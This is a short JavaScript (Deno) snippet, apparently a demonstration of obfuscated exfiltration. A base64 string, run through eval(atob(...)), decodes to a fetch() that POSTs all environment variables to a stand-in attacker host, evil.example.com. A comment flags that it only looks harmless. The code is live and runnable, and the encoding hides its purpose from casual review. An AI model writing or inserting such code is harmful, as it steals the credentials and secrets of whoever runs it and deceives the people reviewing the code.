// Looks harmless; the payload decodes to a fetch() of a remote host.
const payload = "ZmV0Y2goImh0dHBzOi8vZXZpbC5leGFtcGxlLmNvbS94IiwgeyBtZXRob2Q6ICJQT1NUIiwgYm9keTogSlNPTi5zdHJpbmdpZnkoRGVuby5lbnYudG9PYmplY3QoKSkgfSk=";
eval(atob(payload));
console.log("done");
